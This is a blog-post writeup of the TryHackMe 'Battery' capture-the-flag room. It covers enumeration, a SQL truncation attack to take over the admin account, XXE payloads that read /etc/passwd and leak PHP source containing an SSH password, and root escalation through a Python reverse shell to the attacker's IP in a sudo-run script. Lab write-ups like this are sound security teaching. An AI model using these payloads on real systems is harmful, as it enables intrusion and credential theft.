---
weight: 3
title: "CTF writeup - TryHackMe - Battery"
date: 2022-09-02
lastmod: 2022-09-02T19:16:40+08:00
description: "Friday night CTF on the awesome platform TryHackMe"
featuredImage: "tryhackmebanner.jpg"
hiddenfeaturedImage: false

tags: ["TryHackMe", "CTF", "Linux"]
categories: ["Writeups"]

lightgallery: false
summary: This is a short walkthrough of how to exploit a website with XXE, SQLi and a reverse python shell
---

# TryHackMe CTF - battery

"CTF designed by CTF lover for CTF lovers"

# Scanning & Enumeration

## NMAP

PORT   STATE SERVICE
22/tcp open  ssh  OpenSSH 6.6.1p1 Ubuntu
80/tcp open  http Apache httpd 2.4.7 ((Ubuntu))

## Directory busting

```bash
python3 [dirsearch.py](http://dirsearch.py/) -u [http://10.10.179.37:80](http://10.10.179.37/) -e php,cgi,html,txt -x 400,401,403 -r -R 3 -t 100
[09:55:13] Starting:
[09:55:24] 200 -  663B  - /admin.php
[09:55:28] 302 -  908B  - /dashboard.php  ->  admin.php
[09:55:29] 200 -    2KB - /forms.php
[09:55:29] 200 -  406B  - /index.html
[09:55:30] 302 -    0B  - /logout.php  ->  admin.php
[09:55:32] 200 -  715B  - /register.php
[09:55:32] 200 -   17KB - /report
[09:55:32] 200 -    2KB - /scripts/     (Added to queue)
[09:55:32] 301 -  313B  - /scripts  ->  [http://10.10.179.37/scripts/](http://10.10.179.37/scripts/)
[09:55:34] Starting: scripts/
```
{{< figure src="/battery/Untitled.png" >}}

# Recon & Site enumeration

Going to the admin.php page, we are greeted with a login page and the option to register a new user.

Interesting. We can try to enumerate valid user accounts with this function.
I tried to register user “admin” , but the username was already taken.

{{< figure src="/battery/Untitled%201.png" >}}

This shows us that there is an active administrator account.
I tried password brute-forcing with Burp Intruder, but I got no hits.

### View source

I always try to view the source of interesting pages as soon as I can.
This time, it revealed something interesting. A discrepency between the register.php and admin.php **maxlength value**:

{{< figure src="/battery/Untitled%202.png" >}}

After some googling around, I found a good resource on SQL injection types of password/account attacks.

[https://book.hacktricks.xyz/pentesting-web/sql-injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)

Basically, it describes the attacks like this:

- Create user named: AdMIn (uppercase & lowercase letters)
- Create a user named: admin=
- SQL Truncation Attack (when there is some kind of length limit in the username or email) --> Create user with name: admin [a lot of spaces] a

What I found to best suit my scenario is the “SQL Truncation Attack”.

### SQL Truncation Attack

If the database is vulnerable and the max number of chars for username is for example 30 and you want to impersonate the user admin, try to create a username called: "admin [30 spaces] a" and any password.

So, we need to find the correct Administrator account name. (admin was not it)

# More enumeration

Looking at the dirsearch result again, I went to /report.
It prompted a file download for a file named “report”.

Interesting...running strings on the file shows us that this is probably an .ELF file, and the following usernames:

{{< figure src="/battery/Untitled%203.png" >}}

# Exploiting the admin account

So, with the proper username for the administrator account, we can try to exploit the login / register form with our newly discovered **SQL Truncation Attack**.

Remember, the registration page allows a maximum of 12 characters only, and the login page allows for 14 characters for the username.

We want to register a new admin user with spaces behind it to trick the application, and for this we need to edit the maxlength with Firefox developer tools (F12).

{{< figure src="/battery/Untitled%204.png" >}}

After creating our new admin account with “admin@bank.a X” (NOTE the 14 length of characters instead of 12) with our own password, we can then login as an administrator.

We can see that we have access to the “My Account” and “command” pages in the dashboard which were restricted before with our Guest account.

{{< figure src="/battery/Untitled%205.png" >}}

The page “My Account” has some input fields that seem interesting.
My first input was some standard Linux commands.
They all got filtered out, except for “whoami”.

{{< figure src="/battery/Untitled%206.png" >}}

**ms:whoamiwww-data**

So apparently this page is a rabbit hole...

There was another interesting page, the “command” page available to us in the admin dashboard (forms.php).

Viewing the source it looks like some sort of JS with an XML function... perhaps this opens up for exploit through XXE?

{{< figure src="/battery/Untitled%207.png" >}}

{{< figure src="/battery/Untitled%208.png" >}}

When submitting with the “send message” button, The POST request looks like this:

{{< figure src="/battery/Untitled%209.png" >}}

# Investigation with Burp

Let's investiage further! My go-to resource for payloads is of course:

[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

Here, I try the first payload on my mind that reads the users in /etc/passwd:

```bash
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

{{< figure src="/battery/Untitled%2010.png" >}}

And the response is:

{{< figure src="/battery/Untitled%2011.png" >}}

This reveals some usernames now for the SSH login: cyber and yash.

After trying to bruteforce these two accounts for30 minutes, I gave up.
This was probably a rabbit hole...

So I looked further in the payloads section for XXE, and found something called “PHP Wrapper Inside XXE”.
This could let us read the .php files for the restricted admin dashboard.

{{< figure src="/battery/Untitled%2012.png" >}}

Looking at the request, it is decoded with Base64.

Decoding it with CyberChef shows us the SSH password for the user “cyber”.

{{< figure src="/battery/Untitled%2013.png" >}}

# Gaining access

We SSH into the machine with our newly acquired credentials and get our first flag!

{{< figure src="/battery/Untitled%2014.png" >}}

We can also see that there is a Python script owned by root here.

{{< figure src="/battery/Untitled%2015.png" >}}

sudo -l reveals that our user “cyber” can run commands as root

{{< figure src="/battery/Untitled%2016.png" >}}

# Privilege Escalation

We can abuse this for privesc.
My first thought is creating a reverse python shell.

I delete the [run.py](http://run.py/) owned by root and create a new one.

Reverse shell payload in [run.py](http://run.py/):

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.11.17.119",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
```

I execute it with the allowed sudo command:

```bash
sudo /usr/bin/python3 /home/cyber/run.py
```

Back on my kali machine:

{{< figure src="/battery/Untitled%2017.png" >}}

With this, we can read all 3 flags (cyber, yash and root) to complete the room.